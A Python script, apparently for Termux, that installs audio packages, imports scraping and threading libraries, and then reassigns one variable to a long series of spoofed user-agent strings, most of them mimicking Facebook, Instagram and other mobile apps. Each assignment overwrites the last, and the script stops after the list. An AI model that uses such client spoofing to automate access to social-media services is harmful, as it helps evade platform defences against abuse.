import os 
os.system("pkg install sox -y")
os.system("play op.mp3")
os.system("pkg install espeak")
import requests,bs4,json,os,sys,random,datetime,time,re,json,uuid,random
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2271 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/382.0.0.11.115;FBDM/DisplayMetrics{density=2.0, width=720, height=1456, scaledDensity=2.0, xdpi=269.218, ydpi=269.21};",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 8.1.0; TWZ V7 Build/OPM2.171019.012)",]
ua = ["Roku/DVP-12.5 (12.5.5.4174-DL)",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 11; moto g(20)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.609 YaApp_Android/23.114.1 YaSearchBrowser/23.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 10; VOG-TL00 Build/HUAWEIBAH3-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Safari/537.36 OPR/75.0.2254.68965",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OpenWave/92.4.6553.54",]
ua = ["Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J610FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [ip:176.201.57.0",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2007J3SY Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-A920F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-G990E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J530F/J530FXXS8CUE4 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-A305GT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) plus Build/OPW27.113-89; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A125M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A526B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J610G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A305GT Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 6.1; Y7 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; TECNO KD6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_28.4.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/CA RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/D059C330-C389-422E-9173-B099D2146BFB",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 270.0.0.13.83 (iPhone13,2; iOS 16_3_1; tr_TR; tr-TR; scale=3.00; 1170x2532; 445843881)",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4660939440)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; CPH2139 Build/RKQ1.211119.001)",]
ua = ["TuneIn Radio/25.1.0; iPhone15%2C2; iOS/16.3",]
ua = ["Mozilla/5.0 (Linux; 11; RMX3286) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",]
ua = ["TuneIn Radio/25.1.0; iPad13,11; iPadOS/16.3.1",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2247 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; GCE x86 phone Build/PGR1.190916.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 [ip:35.245.243.245",]
ua = ["Mozilla/5.0 (Linux; Android 9; GCE x86 phone Build/PGR1.190916.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 [ip:35.245.243.240",]
ua = ["Mozilla/5.0 (Linux; Android 9; GCE x86 phone Build/PGR1.190916.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 [ip:35.245.243.244",]
ua = ["Mozilla/5.0 (Linux; Android 9; GCE x86 phone Build/PGR1.190916.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 [ip:35.245.243.242",]
ua = ["Mozilla/5.0 (Linux; Android 11; Mi 9T Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:79.25.90.225",]
ua = ["Mozilla/5.0 (Linux; Android 11; V2120 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022084690",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2201117SY Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.0.3922.70977",]
ua = ["Mozilla/5.0 (Linux; Android 10; CPH1875) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118458",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; MI 8 Pro Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["TwitterAndroid/9.80.0-release.0 (29800000-r-0) SM-N975F/7.1.2 (samsung;SM-N975F;samsung;SM-N975F;0;;1;2016)",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2145 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 273.0.0.16.70 (iPhone12,1; iOS 16_3_1; tr_TR; tr-TR; scale=2.00; 828x1792; 452417278",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; EML-L29 Build/HUAWEIEML-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Android 10; Mobile; rv:109.0) Gecko/111.0 Firefox/111.0 [ip:87.12.52.138",]
ua = ["TuneIn Radio/25.1.0; iPhone14,3; iOS/15.0.2",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia 5.4 Build/SKQ1.220119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; LGL423DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-T725 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170",]
ua = ["AppleCoreMedia/1.0.0.21G115 (Macintosh; U; Intel Mac OS X 15_7; hr_hr)",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 9; LM-X320 Build/PKQ1.190414.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; AFTLBT962E2 Build/PS7290.2744N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.160 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A528B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 4.4.4; SM-T560) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 [ip:87.17.151.73",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2103K19G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; 1AZ2P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36 [ip:37.159.75.249]",]
ua = ["Mozilla/5.0 (Linux; Android 12; 2201116TG Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GNews Android/2022108570",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2002J9G Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; E940-2795-00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.0.3922.70977",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A750FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6 Build/TQ1A.230205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; LM-K510 Build/QKQ1.200730.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M135M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/405.1.0.32.71;FBBV/454815867;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/456969795",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A025AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["radio.net 5.6.19 (iPhone; iPhone OS 16.3.1; ru_MD)",]
ua = ["Mozilla/5.0 (Linux; Android 9; ANE-LX3 Build/HUAWEIANE-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 UCURSOS/v1.6_282-android",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; BTV-DL09 Build/HUAWEIBEETHOVEN-DL09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (5836432512)",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:93.148.109.124",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2007J20CG Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022116172",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4372599744)",]
ua = ["AppleCoreMedia/1.0.0.20D67 (iPad; U; CPU OS 16_3_1 like Mac OS X; hu_hu)",]
ua = ["Mozilla/5.0 (Linux; Android 11; TFY-LX1 Build/HONORTFY-L31CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; motorola edge 30 neo Build/S3SSMS32.34-46-1-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A528B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 10; HTC Desire 20 Pro Build/QQ1A.200205.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g pro Build/S0PRS32.44-11-10-22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; Mi 9T Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2003J15SC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 274.0.0.16.90 (iPhone14,3; iOS 16_3_1; tr_TR; tr-TR; scale=3.00; 1284x2778; 455531335) NW/3",]
ua = ["Mozilla/5.0 (Linux; Android 9; moto e6s Build/POBS29.288-60-6-1-29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["TuneIn Radio/25.1.0; iPhone13,2; iOS/16.3",]
